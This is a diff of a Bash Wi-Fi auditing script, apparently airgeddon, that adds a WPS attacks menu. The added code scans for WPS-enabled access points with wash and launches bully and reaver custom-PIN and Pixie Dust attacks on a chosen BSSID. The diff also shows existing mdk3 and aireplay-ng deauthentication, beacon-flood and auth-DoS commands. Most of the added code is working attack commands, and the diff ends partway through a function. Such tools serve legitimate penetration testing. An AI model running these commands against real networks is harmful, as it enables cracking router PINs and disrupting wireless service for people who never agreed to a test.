+	arr["SPANISH",366]="Tras parar el ataque (usando Ctrl+C), la ventana del ataque no se cerrará automáticamente. Asi tendrás tiempo de anotar la contraseña en caso de tener éxito. Tendrás que cerrarla manualmente"
+	arr["FRENCH",366]="${pending_of_translation} Après l'arrêt de l'attaque (en utilisant Ctrl+C), la fenêtre ne se ferme pas automatiquement attaque. Donc, avoir le temps d'écrire le mot de passe en cas de succès. Vous devez fermer manuellement"
+	arr["CATALAN",366]="${pending_of_translation} Després parar l'atac (usant Ctrl+C), la finestra de l'atac no es tancarà automàticament. Així tindràs temps d'anotar la contrasenya en cas de tenir èxit. Hauràs de tancar-la manualment"
+	arr["PORTUGUESE",366]="${pending_of_translation} Depois de parar o ataque (usando Ctrl+C), a janela não será fechada automaticamente ataque. Então temos tempo para anotar a senha em caso de êxito. Você vai ter que fechá-lo manualmente"
+	arr["RUSSIAN",366]="После остановки атаки (используя Ctrl+C), окно автоматически не закроется. У вас будет время переписать пароль, если атака завершилась успешно. Затем вам нужно закрыть его вручную"
+	arr["GREEK",366]="${pending_of_translation} Μετά τη διακοπή της επίθεσης (με Ctrl+C), το παράθυρο δεν θα κλείσει αυτόματα επίθεση. Έτσι, έχετε χρόνο να γράψετε τον κωδικό πρόσβασης σε περίπτωση επιτυχίας. Θα πρέπει να το κλείσει χειροκίνητα"
+
+	arr["ENGLISH",367]="You have bully installed (v${bully_version}), but not required version. To perform Pixie Dust integrated bully attack you must have at least version v${minimum_bully_pixiewps_version}"
+	arr["SPANISH",367]="Tienes bully instalado (v${bully_version}), aunque no la versión requerida. Para realizar el ataque Pixie Dust integrado con bully has de tener al menos la versión v${minimum_bully_pixiewps_version}"
+	arr["FRENCH",367]="${pending_of_translation} Vous bully installé (v${bully_version}), mais pas la version requise. Pour rendre l'attaque bully intégrée Pixie Dust doit avoir au moins la version v${minimum_bully_pixiewps_version}"
+	arr["CATALAN",367]="${pending_of_translation} Tens bully instal·lat (v${bully_version}), encara que no la versió requerida. Per realitzar l'atac Pixie Dust integrat amb bully has de tenir almenys la versió v${minimum_bully_pixiewps_version}"
+	arr["PORTUGUESE",367]="${pending_of_translation} Você bully instalado (v${bully_version}), mas não a versão necessária. Para fazer o ataque bully integrado Pixie Dust tem que ter pelo menos a versão v${minimum_bully_pixiewps_version}"
+	arr["RUSSIAN",367]="У вас установлен bully (v${bully_version}), но не та версия, которая требуется. Для выполнения интегрированной в bully атаки Pixie Dust у вас должна быть по крайне мере версия v${minimum_bully_pixiewps_version}"
+	arr["GREEK",367]="${pending_of_translation} Μπορείτε bully εγκατασταθεί (v${bully_version}), αλλά όχι την απαιτούμενη έκδοση. Για να κάνετε την Pixie Dust ολοκληρωμένη επίθεση bully πρέπει να έχει τουλάχιστον την έκδοση v${minimum_bully_pixiewps_version}"
+
+	arr["ENGLISH",368]="You have bully installed (v${bully_version}). You meet the version requirement to perform Pixie Dust integrated bully attack (minimum version v${minimum_bully_pixiewps_version}). Script can continue..."
+	arr["SPANISH",368]="Tienes bully instalado (v${bully_version}). Cumples con el requisito de versión para realizar el ataque Pixie Dust integrado con bully (versión minima v${minimum_bully_pixiewps_version}). El script puede continuar..."
+	arr["FRENCH",368]="${pending_of_translation} Vous bully installé (v${bully_version}). Vous répondez aux exigences de version pour le Pixie Dust intégré attaque bully (version minimale v${minimum_bully_pixiewps_version}). Le script peut continuer..."
+	arr["CATALAN",368]="${pending_of_translation} Tens bully instal·lat (v${bully_version}). Compleixes amb el requisit de versió per a realitzar l'atac Pixie Dust integrat amb bully (versió mínima v${minimum_bully_pixiewps_version}). El script pot continuar..."
+	arr["PORTUGUESE",368]="${pending_of_translation} Você bully instalado (v${bully_version}). Você cumprir a exigência versão para o Pixie Dust ataque bully integrado (versão mínima v${minimum_bully_pixiewps_version}). O script pode continuar..."
+	arr["RUSSIAN",368]="У вас установлен bully (v${bully_version}). Версия удовлетворяет требованиям для проведения интегрированной в bully атаки Pixie Dust (минимальная версия v${minimum_bully_pixiewps_version}). Скрипт может продолжить работу..."
+	arr["GREEK",368]="${pending_of_translation} Μπορείτε bully εγκατασταθεί (v${bully_version}). Μπορείτε να πληρούν την απαίτηση έκδοσης για την Pixie Dust ολοκληρωμένη επίθεση bully (ελάχιστη έκδοση v${minimum_bully_pixiewps_version}). Το script μπορεί να συνεχίσει..."
+
+	arr["ENGLISH",369]="To perform the Pixie Dust integrated attack with reaver or bully, you must have installed at least ${minimum_reaver_pixiewps_version} version for reaver and ${minimum_bully_pixiewps_version} for bully"
+	arr["SPANISH",369]="Para realizar el ataque Pixie Dust integrado con reaver o con bully, has de tener instalada como mínimo la versión ${minimum_reaver_pixiewps_version} para reaver y ${minimum_bully_pixiewps_version} para bully"
+	arr["FRENCH",369]="${pending_of_translation} Pour rendre le Pixie Dust intégré attaque reaver ou bully, vous devez avoir installé au moins le ${minimum_reaver_pixiewps_version} por reaver et ${minimum_bully_pixiewps_version} pour bully"
+	arr["CATALAN",369]="${pending_of_translation} Per realitzar l'atac Pixie Dust integrat amb reaver o amb bully, has de tenir instal·lada com a mínim la versió ${minimum_reaver_pixiewps_version} per reaver i ${minimum_bully_pixiewps_version} per bully"
+	arr["PORTUGUESE",369]="${pending_of_translation} Para executar o ataque reaver integrada Pixie Dust ou bully, é necessário ter instalado pelo menos a versão ${minimum_reaver_pixiewps_version} para reaver e ${minimum_bully_pixiewps_version} para bully"
+	arr["RUSSIAN",369]="Для выполнения интегрированной атаки Pixie Dust с reaver или bully, у вас должна быть установлена, по крайней мере, версия ${minimum_reaver_pixiewps_version} для reaver и ${minimum_bully_pixiewps_version} для bully"
+	arr["GREEK",369]="${pending_of_translation} Για να κάνετε την Pixie Dust επίθεση ολοκληρωμένη reaver ή bully, θα πρέπει να έχετε εγκαταστήσει τουλάχιστον την έκδοση ${minimum_reaver_pixiewps_version} για reaver και ${minimum_bully_pixiewps_version} για bully"
+
+	arr["ENGLISH",370]="You have reaver installed (v${reaver_version}). You meet the version requirement to perform Pixie Dust integrated reaver attack (minimum version v${minimum_reaver_pixiewps_version}). Script can continue..."
+	arr["SPANISH",370]="Tienes reaver instalado (v${reaver_version}). Cumples con el requisito de versión para realizar el ataque Pixie Dust integrado con reaver (versión minima v${minimum_reaver_pixiewps_version}). El script puede continuar..."
+	arr["FRENCH",370]="${pending_of_translation} Vous reaver installé (v${reaver_version}). Vous répondez aux exigences de version pour le Pixie Dust intégré attaque reaver (version minimale v${minimum_reaver_pixiewps_version}). Le script peut continuer..."
+	arr["CATALAN",370]="${pending_of_translation} Tens reaver instal·lat (v${reaver_version}). Compleixes amb el requisit de versió per a realitzar l'atac Pixie Dust integrat amb reaver (versió mínima v${minimum_reaver_pixiewps_version}). El script pot continuar..."
+	arr["PORTUGUESE",370]="${pending_of_translation} Você reaver instalado (v${reaver_version}). Você cumprir a exigência versão para o Pixie Dust ataque reaver integrado (versão mínima v${minimum_reaver_pixiewps_version}). O script pode continuar..."
+	arr["RUSSIAN",370]="У вас установлен reaver (v${reaver_version}). Версия удовлетворяет требованиям для выполнения интегрированной в reaver атаки Pixie Dust (минимальная версия v${minimum_reaver_pixiewps_version}). Скрипт может продолжить работу..."
+	arr["GREEK",370]="${pending_of_translation} Μπορείτε reaver εγκατασταθεί (v${reaver_version}). Μπορείτε να πληρούν την απαίτηση έκδοσης για την Pixie Dust ολοκληρωμένη επίθεση reaver (ελάχιστη έκδοση v${minimum_reaver_pixiewps_version}). Το script μπορεί να συνεχίσει..."
+
+	arr["ENGLISH",371]="You have reaver installed (v${reaver_version}), but not required version. To perform Pixie Dust integrated reaver attack you must have at least version v${minimum_reaver_pixiewps_version}"
+	arr["SPANISH",371]="Tienes reaver instalado (v${reaver_version}), aunque no la versión requerida. Para realizar el ataque Pixie Dust integrado con reaver has de tener al menos la versión v${minimum_reaver_pixiewps_version}"
+	arr["FRENCH",371]="${pending_of_translation} Vous reaver installé (v${reaver_version}), mais pas la version requise. Pour rendre l'attaque reaver intégrée Pixie Dust doit avoir au moins la version v${minimum_reaver_pixiewps_version}"
+	arr["CATALAN",371]="${pending_of_translation} Tens reaver instal·lat (v${reaver_version}), encara que no la versió requerida. Per realitzar l'atac Pixie Dust integrat amb reaver has de tenir almenys la versió v${minimum_reaver_pixiewps_version}"
+	arr["PORTUGUESE",371]="${pending_of_translation} Você reaver instalado (v${reaver_version}), mas não a versão necessária. Para fazer o ataque reaver integrado Pixie Dust tem que ter pelo menos a versão v${minimum_reaver_pixiewps_version}"
+	arr["RUSSIAN",371]="У вас установлен reaver (v${reaver_version}), но не та версия, которая требуется. Для выполнения интегрированной в reaver атаки Pixie Dust у вас должна быть по крайней мере v${minimum_reaver_pixiewps_version}"
+	arr["GREEK",371]="${pending_of_translation} Μπορείτε reaver εγκατασταθεί (v${reaver_version}), αλλά όχι την απαιτούμενη έκδοση. Για να κάνετε την Pixie Dust ολοκληρωμένη επίθεση reaver πρέπει να έχει τουλάχιστον την έκδοση v${minimum_reaver_pixiewps_version}"
 
 	case "${3}" in
 		"yellow")
@@ -3857,17 +4171,31 @@ function read_channel() {
 
 	echo
 	language_strings "${language}" 25 "green"
-	read -r channel
+	if [ "${1}" = "wps" ]; then
+		read -r wps_channel
+	else
+		read -r channel
+	fi
 }
 
 #Validate the input on channel questions
 function ask_channel() {
 
-	while [[ ! ${channel} =~ ^([1-9]|1[0-4])$ ]]; do
-		read_channel
-	done
-	echo
-	language_strings "${language}" 26 "blue"
+	local regexp="^([1-9]|1[0-4])$"
+
+	if [ "${1}" = "wps" ]; then
+		while [[ ! ${wps_channel} =~ ${regexp} ]]; do
+			read_channel "wps"
+		done
+		echo
+		language_strings "${language}" 365 "blue"
+	else
+		while [[ ! ${channel} =~ ${regexp} ]]; do
+			read_channel
+		done
+		echo
+		language_strings "${language}" 26 "blue"
+	fi
 }
 
 #Read the user input on bssid questions
@@ -3875,17 +4203,31 @@ function read_bssid() {
 
 	echo
 	language_strings "${language}" 27 "green"
-	read -r bssid
+	if [ "${1}" = "wps" ]; then
+		read -r wps_bssid
+	else
+		read -r bssid
+	fi
 }
 
 #Validate the input on bssid questions
 function ask_bssid() {
 
-	while [[ ! ${bssid} =~ ^([a-fA-F0-9]{2}:){5}[a-zA-Z0-9]{2}$ ]]; do
-		read_bssid
-	done
-	echo
-	language_strings "${language}" 28 "blue"
+	local regexp="^([a-fA-F0-9]{2}:){5}[a-zA-Z0-9]{2}$"
+
+	if [ "${1}" = "wps" ]; then
+		while [[ ! ${wps_bssid} =~ ${regexp} ]]; do
+			read_bssid "wps"
+		done
+		echo
+		language_strings "${language}" 364 "blue"
+	else
+		while [[ ! ${bssid} =~ ${regexp} ]]; do
+			read_bssid
+		done
+		echo
+		language_strings "${language}" 28 "blue"
+	fi
 }
 
 #Read the user input on essid questions
@@ -3913,6 +4255,83 @@ function ask_essid() {
 	language_strings "${language}" 31 "blue"
 }
 
+#Read the user input on custom pin questions
+function read_custom_pin() {
+
+	echo
+	language_strings "${language}" 363 "green"
+	read -r custom_pin
+}
+
+#Validate the input on custom pin questions
+function ask_custom_pin() {
+
+	local regexp="^[0-9]{8}$"
+	custom_pin=""
+	while [[ ! ${custom_pin} =~ ${regexp} ]]; do
+		read_custom_pin
+	done
+
+	echo
+	language_strings "${language}" 362 "blue"
+}
+
+#Execute wps custom pin bully attack
+function exec_wps_custom_pin_bully_attack() {
+
+	echo
+	language_strings "${language}" 32 "green"
+
+	echo
+	language_strings "${language}" 33 "yellow"
+	language_strings "${language}" 366 "blue"
+	language_strings "${language}" 4 "read"
+	recalculate_windows_sizes
+	xterm -hold -bg black -fg red -geometry "${g2_stdleft_window}" -T "WPS custom pin bully attack" -e "bully ${interface} -b ${wps_bssid} -c ${wps_channel} -L --force -B -p ${custom_pin} -v 2 && echo \"Close this window\"" > /dev/null 2>&1
+}
+
+#Execute wps custom pin reaver attack
+function exec_wps_custom_pin_reaver_attack() {
+
+	echo
+	language_strings "${language}" 32 "green"
+
+	echo
+	language_strings "${language}" 33 "yellow"
+	language_strings "${language}" 366 "blue"
+	language_strings "${language}" 4 "read"
+	recalculate_windows_sizes
+	xterm -hold -bg black -fg red -geometry "${g2_stdleft_window}" -T "WPS custom pin reaver attack" -e "reaver -i ${interface} -b ${wps_bssid} -c ${wps_channel} -L -f -n -p ${custom_pin} -vv && echo \"Close this window\"" > /dev/null 2>&1
+}
+
+#Execute bully pixie dust attack
+function exec_bully_pixiewps_attack() {
+
+	echo
+	language_strings "${language}" 32 "green"
+
+	echo
+	language_strings "${language}" 33 "yellow"
+	language_strings "${language}" 366 "blue"
+	language_strings "${language}" 4 "read"
+	recalculate_windows_sizes
+	xterm -hold -bg black -fg red -geometry "${g2_stdright_window}" -T "WPS bully pixie dust attack" -e "bully ${interface} -b ${wps_bssid} -c ${wps_channel} -d -v 2 && echo \"Close this window\"" > /dev/null 2>&1
+}
+
+#Execute reaver pixie dust attack
+function exec_reaver_pixiewps_attack() {
+
+	echo
+	language_strings "${language}" 32 "green"
+
+	echo
+	language_strings "${language}" 33 "yellow"
+	language_strings "${language}" 366 "blue"
+	language_strings "${language}" 4 "read"
+	recalculate_windows_sizes
+	xterm -hold -bg black -fg red -geometry "${g2_stdright_window}" -T "WPS reaver pixie dust attack" -e "reaver -i ${interface} -b ${wps_bssid} -c ${wps_channel} -K 1 -vv && echo \"Close this window\"" > /dev/null 2>&1
+}
+
 #Execute mdk3 deauth DoS attack
 function exec_mdk3deauth() {
 
@@ -3925,7 +4344,7 @@ function exec_mdk3deauth() {
 	echo "${bssid}" > "${tmpdir}bl.txt"
 
 	echo
-	language_strings "${language}" 33 "blue"
+	language_strings "${language}" 33 "yellow"
 	language_strings "${language}" 4 "read"
 	recalculate_windows_sizes
 	xterm +j -bg black -fg red -geometry "${g1_topleft_window}" -T "mdk3 amok attack" -e mdk3 "${interface}" d -b "${tmpdir}bl.txt" -c "${channel}" > /dev/null 2>&1
@@ -3941,7 +4360,7 @@ function exec_aireplaydeauth() {
 	${airmon} start "${interface}" "${channel}" > /dev/null 2>&1
 
 	echo
-	language_strings "${language}" 33 "blue"
+	language_strings "${language}" 33 "yellow"
 	language_strings "${language}" 4 "read"
 	recalculate_windows_sizes
 	xterm +j -bg black -fg red -geometry "${g1_topleft_window}" -T "aireplay deauth attack" -e aireplay-ng --deauth 0 -a "${bssid}" --ignore-negative-one "${interface}" > /dev/null 2>&1
@@ -3955,7 +4374,7 @@ function exec_wdsconfusion() {
 	language_strings "${language}" 32 "green"
 
 	echo
-	language_strings "${language}" 33 "blue"
+	language_strings "${language}" 33 "yellow"
 	language_strings "${language}" 4 "read"
 	recalculate_windows_sizes
 	xterm +j -bg black -fg red -geometry "${g1_topleft_window}" -T "wids / wips / wds confusion attack" -e mdk3 "${interface}" w -e "${essid}" -c "${channel}" > /dev/null 2>&1
@@ -3969,7 +4388,7 @@ function exec_beaconflood() {
 	language_strings "${language}" 32 "green"
 
 	echo
-	language_strings "${language}" 33 "blue"
+	language_strings "${language}" 33 "yellow"
 	language_strings "${language}" 4 "read"
 	recalculate_windows_sizes
 	xterm +j -sb -rightbar -geometry "${g1_topleft_window}" -T "beacon flood attack" -e mdk3 "${interface}" b -n "${essid}" -c "${channel}" -s 1000 -h > /dev/null 2>&1
@@ -3983,7 +4402,7 @@ function exec_authdos() {
 	language_strings "${language}" 32 "green"
 
 	echo
-	language_strings "${language}" 33 "blue"
+	language_strings "${language}" 33 "yellow"
 	language_strings "${language}" 4 "read"
 	recalculate_windows_sizes
 	xterm +j -sb -rightbar -geometry "${g1_topleft_window}" -T "auth dos attack" -e mdk3 "${interface}" a -a "${bssid}" -m -s 1024 > /dev/null 2>&1
@@ -3997,7 +4416,7 @@ function exec_michaelshutdown() {
 	language_strings "${language}" 32 "green"
 
 	echo
-	language_strings "${language}" 33 "blue"
+	language_strings "${language}" 33 "yellow"
 	language_strings "${language}" 4 "read"
 	recalculate_windows_sizes
 	xterm +j -sb -rightbar -geometry "${g1_topleft_window}" -T "michael shutdown attack" -e mdk3 "${interface}" m -t "${bssid}" -w 1 -n 1024 -s 1024 > /dev/null 2>&1
@@ -4121,6 +4540,37 @@ function michael_shutdown_option() {
 	exec_michaelshutdown
 }
 
+#Validate wps custom pin parameters
+function wps_custom_pin_parameters() {
+
+	check_monitor_enabled
+	if [ "$?" != "0" ]; then
+		return
+	fi
+
+	echo
+	language_strings "${language}" 34 "yellow"
+
+	ask_bssid "wps"
+	ask_channel "wps"
+	ask_custom_pin
+}
+
+#Validate pixie dust parameters
+function wps_pixie_dust_parameters() {
+
+	check_monitor_enabled
+	if [ "$?" != "0" ]; then
+		return
+	fi
+
+	echo
+	language_strings "${language}" 34 "yellow"
+
+	ask_bssid "wps"
+	ask_channel "wps"
+}
+
 #Print selected interface
 function print_iface_selected() {
 
@@ -4240,6 +4690,38 @@ function print_et_target_vars() {
 	fi
 }
 
+#Print selected target parameters on wps attacks menu (bssid, channel and essid)
+function print_all_target_vars_wps() {
+
+	if [ -n "${wps_bssid}" ]; then
+		language_strings "${language}" 335 "blue"
+	else
+		language_strings "${language}" 339 "blue"
+	fi
+
+	if [ -n "${wps_channel}" ]; then
+		language_strings "${language}" 336 "blue"
+	else
+		language_strings "${language}" 340 "blue"
+	fi
+
+	if [ -n "${wps_essid}" ]; then
+		if [ "${wps_essid}" = "(Hidden Network)" ]; then
+			language_strings "${language}" 337 "blue"
+		else
+			language_strings "${language}" 338 "blue"
+		fi
+	else
+		language_strings "${language}" 341 "blue"
+	fi
+
+	if [ -n "${wps_locked}" ]; then
+		language_strings "${language}" 351 "blue"
+	else
+		language_strings "${language}" 352 "blue"
+	fi
+}
+
 #Print selected target parameters on decrypt menu (bssid, Handshake file, dictionary file and rules file)
 function print_decrypt_vars() {
 
@@ -4276,6 +4758,11 @@ function initialize_menu_options_dependencies() {
 	et_sniffing_dependencies=(${optional_tools_names[5]} ${optional_tools_names[6]} ${optional_tools_names[7]} ${optional_tools_names[8]} ${optional_tools_names[9]})
 	et_sniffing_sslstrip_dependencies=(${optional_tools_names[5]} ${optional_tools_names[6]} ${optional_tools_names[7]} ${optional_tools_names[8]} ${optional_tools_names[9]} ${optional_tools_names[10]})
 	et_captive_portal_dependencies=(${optional_tools_names[5]} ${optional_tools_names[6]} ${optional_tools_names[7]} ${optional_tools_names[11]})
+	wash_scan_dependencies=(${optional_tools_names[13]})
+	reaver_attacks_dependencies=(${optional_tools_names[14]})
+	bully_attacks_dependencies=(${optional_tools_names[15]})
+	bully_pixie_dust_attack_dependencies=(${optional_tools_names[15]} ${optional_tools_names[16]})
+	reaver_pixie_dust_attack_dependencies=(${optional_tools_names[14]} ${optional_tools_names[16]})
 }
 
 #Set some vars depending of the menu and invoke the printing of target vars
@@ -4325,6 +4812,10 @@ function initialize_menu_and_print_selections() {
 			print_et_target_vars
 			print_iface_internet_selected
 		;;
+		"wps_attacks_menu")
+			print_iface_selected
+			print_all_target_vars_wps
+		;;
 		*)
 			print_iface_selected
 			print_all_target_vars
@@ -4351,6 +4842,7 @@ function clean_tmpfiles() {
 	if [ "${dhcpd_path_changed}" -eq 1 ]; then
 		rm -rf "${dhcp_path}" > /dev/null 2>&1
 	fi
+	rm -rf "${tmpdir}wps"* > /dev/null 2>&1
 }
 
 #Clean firewall rules and restore orginal routing state
@@ -4454,6 +4946,13 @@ function print_hint() {
 			randomhint=$(shuf -i 0-"${hintlength}" -n 1)
 			strtoprint=${hints[evil_twin_dos_hints|${randomhint}]}
 		;;
+		"wps_attacks_menu")
+			store_array hints wps_hints "${wps_hints[@]}"
+			hintlength=${#wps_hints[@]}
+			((hintlength--))
+			randomhint=$(shuf -i 0-"${hintlength}" -n 1)
+			strtoprint=${hints[wps_hints|${randomhint}]}
+		;;
 	esac
 
 	print_simple_separator
@@ -4479,6 +4978,7 @@ function main_menu() {
 	language_strings "${language}" 119
 	language_strings "${language}" 169
 	language_strings "${language}" 252
+	language_strings "${language}" 333
 	print_simple_separator
 	language_strings "${language}" 60
 	language_strings "${language}" 78
@@ -4509,12 +5009,15 @@ function main_menu() {
 			evil_twin_attacks_menu
 		;;
 		8)
-			credits_option
+			wps_attacks_menu
 		;;
 		9)
-			language_menu
+			credits_option
 		;;
 		10)
+			language_menu
+		;;
+		11)
 			exit_script_option
 		;;
 		*)
@@ -4644,6 +5147,153 @@ function evil_twin_attacks_menu() {
 	esac
 
 	evil_twin_attacks_menu
+}
+
+#WPS attacks menu
+function wps_attacks_menu() {
+
+	clear
+	language_strings "${language}" 334 "title"
+	current_menu="wps_attacks_menu"
+	initialize_menu_and_print_selections
+	echo
+	language_strings "${language}" 47 "green"
+	print_simple_separator
+	language_strings "${language}" 48
+	language_strings "${language}" 55
+	language_strings "${language}" 56
+	language_strings "${language}" 49 wash_scan_dependencies[@]
+	language_strings "${language}" 50 "separator"
+	language_strings "${language}" 345 bully_attacks_dependencies[@]
+	language_strings "${language}" 357 reaver_attacks_dependencies[@]
+	language_strings "${language}" 346 bully_pixie_dust_attack_dependencies[@]
+	language_strings "${language}" 358 reaver_pixie_dust_attack_dependencies[@]
+	language_strings "${language}" 347 "under_construction" #bully_attacks_dependencies[@]
+	language_strings "${language}" 359 "under_construction" #reaver_attacks_dependencies[@]
+	language_strings "${language}" 348 "under_construction" #bully_attacks_dependencies[@]
+	language_strings "${language}" 360 "under_construction" #reaver_attacks_dependencies[@]
+	print_simple_separator
+	language_strings "${language}" 361
+	print_hint ${current_menu}
+
+	read -r wps_option
+	case ${wps_option} in
+		1)
+			select_interface
+		;;
+		2)
+			monitor_option
+		;;
+		3)
+			managed_option
+		;;
+		4)
+			contains_element "${wps_option}" "${forbidden_options[@]}"
+			if [ "$?" = "0" ]; then
+				forbidden_menu_option
+			else
+				explore_for_wps_targets_option
+			fi
+		;;
+		5)
+			contains_element "${wps_option}" "${forbidden_options[@]}"
+			if [ "$?" = "0" ]; then
+				forbidden_menu_option
+			else
+				wps_custom_pin_parameters
+				exec_wps_custom_pin_bully_attack
+			fi
+		;;
+		6)
+			contains_element "${wps_option}" "${forbidden_options[@]}"
+			if [ "$?" = "0" ]; then
+				forbidden_menu_option
+			else
+				wps_custom_pin_parameters
+				exec_wps_custom_pin_reaver_attack
+			fi
+		;;
+		7)
+			contains_element "${wps_option}" "${forbidden_options[@]}"
+			if [ "$?" = "0" ]; then
+				forbidden_menu_option
+			else
+				get_bully_version
+				validate_bully_pixiewps_version
+				if [ "$?" = "0" ]; then
+					echo
+					language_strings "${language}" 368 "yellow"
+					language_strings "${language}" 115 "read"
+					wps_pixie_dust_parameters
+					exec_bully_pixiewps_attack
+				else
+					echo
+					language_strings "${language}" 367 "yellow"
+					language_strings "${language}" 115 "read"
+				fi
+			fi
+		;;
+		8)
+			contains_element "${wps_option}" "${forbidden_options[@]}"
+			if [ "$?" = "0" ]; then
+				forbidden_menu_option
+			else
+				get_reaver_version
+				validate_reaver_pixiewps_version
+				if [ "$?" = "0" ]; then
+					echo
+					language_strings "${language}" 370 "yellow"
+					language_strings "${language}" 115 "read"
+					wps_pixie_dust_parameters
+					exec_reaver_pixiewps_attack
+				else
+					echo
+					language_strings "${language}" 371 "yellow"
+					language_strings "${language}" 115 "read"
+				fi
+			fi
+		;;
+		9)
+			contains_element "${wps_option}" "${forbidden_options[@]}"
+			if [ "$?" = "0" ]; then
+				forbidden_menu_option
+			else
+				under_construction_message
+			fi
+		;;
+		10)
+			contains_element "${wps_option}" "${forbidden_options[@]}"
+			if [ "$?" = "0" ]; then
+				forbidden_menu_option
+			else
+				under_construction_message
+			fi
+		;;
+		11)
+			contains_element "${wps_option}" "${forbidden_options[@]}"
+			if [ "$?" = "0" ]; then
+				forbidden_menu_option
+			else
+				under_construction_message
+			fi
+		;;
+		12)
+			contains_element "${wps_option}" "${forbidden_options[@]}"
+			if [ "$?" = "0" ]; then
+				forbidden_menu_option
+			else
+				under_construction_message
+			fi
+		;;
+		13)
+			return
+		;;
+		*)
+			invalid_menu_option
+		;;
+	esac
+
+	wps_attacks_menu
 }
 
 #Offline decryption attacks menu
@@ -6924,6 +7574,161 @@ function explore_for_targets_option() {
 	select_target
 }
 
+#Manage target exploration only for Access Points with WPS activated. Parse output files and print menu with results
+function explore_for_wps_targets_option() {
+
+	echo
+	language_strings "${language}" 103 "title"
+	language_strings "${language}" 65 "green"
+
+	check_monitor_enabled
+	if [ "$?" != "0" ]; then
+		return 1
+	fi
+
+	echo
+	language_strings "${language}" 66 "yellow"
+	echo
+	if ! grep -qe "${interface}" <(echo "${!wash_ifaces_already_set[@]}"); then
+		language_strings "${language}" 353 "blue"
+		set_wash_parametrization
+		language_strings "${language}" 354 "yellow"
+	else
+		language_strings "${language}" 355 "blue"
+	fi
+	echo
+	language_strings "${language}" 67 "yellow"
+	language_strings "${language}" 115 "read"
+
+	tmpfiles_toclean=1
+	rm -rf "${tmpdir}wps"* > /dev/null 2>&1
+	recalculate_windows_sizes
+	xterm +j -bg black -fg white -geometry "${g1_topright_window}" -T "Exploring for WPS targets" -e "wash -i \"${interface}\" ${wash_ifaces_already_set[${interface}]} | tee \"${tmpdir}wps.txt\"" > /dev/null 2>&1
+
+	washlines=$(wc -l "${tmpdir}wps.txt" 2> /dev/null | awk '{print $1}')
+	if [ "${washlines}" -le 7 ]; then
+		echo
+		language_strings "${language}" 68 "yellow"
+		language_strings "${language}" 115 "read"
+		return 1
+	fi
+
+	clear
+	language_strings "${language}" 104 "title"
+	echo
+	language_strings "${language}" 349 "green"
+	print_large_separator
+
+	i=0
+	wash_counter=0
+	declare -A wps_lockeds
+	wps_lockeds[${wash_counter}]="No"
+	while IFS=, read -r expwps_line; do
+
+		i=$((i+1))
+
+		if [ ${i} -le 7 ]; then
+			continue
+		else
+			wash_counter=$((wash_counter+1))
+
+			if [ ${wash_counter} -le 9 ]; then
+				wpssp1=" "
+			else
+				wpssp1=""
+			fi
+
+			expwps_bssid=$(echo "${expwps_line}" | awk '{print $1}')
+			expwps_channel=$(echo "${expwps_line}" | awk '{print $2}')
+			expwps_power=$(echo "${expwps_line}" | awk '{print $3}')
+			expwps_locked=$(echo "${expwps_line}" | awk '{print $5}')
+			expwps_essid=$(echo "${expwps_line}" | awk '{$1=$2=$3=$4=$5=""; print $0}' | sed -e 's/^[ \t]*//')
+
+			if [[ ${expwps_channel} -le 9 ]]; then
+				wpssp2=" "
+				if [[ ${expwps_channel} -eq 0 ]]; then
+					expwps_channel="-"
+				fi
+			else
+				wpssp2=""
+			fi
+
+			if [[ "${expwps_power}" = "" ]] || [[ "${expwps_power}" = "-00" ]]; then
+				expwps_power=0
+			fi
+
+			if [[ ${expwps_power} =~ ^-0 ]]; then
+				expwps_power=${expwps_power//0/}
+			fi
+
+			if [[ ${expwps_power} -lt 0 ]]; then
+				if [[ ${expwps_power} -eq -1 ]]; then
+					exp_power=0
+				else
+					expwps_power=$((expwps_power + 100))
+				fi
+			fi
+
+			if [[ ${expwps_power} -le 9 ]]; then
+				wpssp4=" "
+			else
+				wpssp4=""
+			fi
+
+			if [ "${expwps_locked}" = "Yes" ]; then
+				wpssp3=""
+			else
+				wpssp3=" "
+			fi
+
+			wps_network_names[$wash_counter]=${expwps_essid}
+			wps_channels[$wash_counter]=${expwps_channel}
+			wps_macs[$wash_counter]=${expwps_bssid}
+			wps_lockeds[$wash_counter]=${expwps_locked}
+			echo -e " ${wpssp1}${wash_counter})   ${expwps_bssid}   ${wpssp2}${expwps_channel}    ${wpssp4}${expwps_power}%     ${expwps_locked}${wpssp3}   ${expwps_essid}"
+		fi
+	done < "${tmpdir}wps.txt"
+
+	echo
+	if [ ${wash_counter} -eq 1 ]; then
+		language_strings "${language}" 70 "yellow"
+		selected_wps_target_network=1
+		language_strings "${language}" 115 "read"
+	else
+		print_large_separator
+		language_strings "${language}" 3 "green"
+		read -r selected_wps_target_network
+	fi
+
+	while [[ ${selected_wps_target_network} -lt 1 ]] || [[ ${selected_wps_target_network} -gt ${wash_counter} ]] || [[ ${wps_lockeds[${selected_wps_target_network}]} = "Yes" ]]; do
+
+		if [[ ${selected_wps_target_network} -ge 1 ]] && [[ ${selected_wps_target_network} -le ${wash_counter} ]]; then
+			if [ "${wps_lockeds[${selected_wps_target_network}]}" = "Yes" ]; then
+				ask_yesno 350
+				if [ ${yesno} = "y" ]; then
+					break
+				else
+					echo
+					language_strings "${language}" 3 "green"
+					read -r selected_wps_target_network
+					continue
+				fi
+			fi
+		fi
+
+		echo
+		language_strings "${language}" 72 "yellow"
+		echo
+		language_strings "${language}" 3 "green"
+		read -r selected_wps_target_network
+	done
+
+	wps_essid=${wps_network_names[${selected_wps_target_network}]}
+	wps_channel=${wps_channels[${selected_wps_target_network}]}
+	wps_bssid=${wps_macs[${selected_wps_target_network}]}
+	wps_locked=${wps_lockeds[${selected_wps_target_network}]}
+}
+
 #Create a menu to select target from the parsed data
 function select_target() {
 
@@ -7010,6 +7815,23 @@ function select_target() {
 	channel=${channels[${selected_target_network}]}
 	bssid=${macs[${selected_target_network}]}
 	enc=${encs[${selected_target_network}]}
+}
+
+#Perform a test to determine if fcs parameter is needed on wash scanning
+function set_wash_parametrization() {
+
+	fcs=""
+	declare -gA wash_ifaces_already_set
+	readarray -t WASH_OUTPUT < <(timeout 1 wash -i "${interface}")
+
+	for item in "${WASH_OUTPUT[@]}"; do
+		if [[ ${item} =~ ^\[\!\].*bad[[:space:]]FCS ]]; then
+			fcs="-C"
+			break
+		fi
+	done
+
+	wash_ifaces_already_set[${interface}]=${fcs}
 }
 
 #Manage and validate the prerequisites for Evil Twin attacks
@@ -7572,6 +8394,38 @@ function iwconfig_fix() {
 	if [ "${iwversion}" -lt 30 ]; then
 		iwcmdfix=" 2> /dev/null | grep Mode: "
 	fi
+}
+
+#Determine bully version
+function get_bully_version() {
+
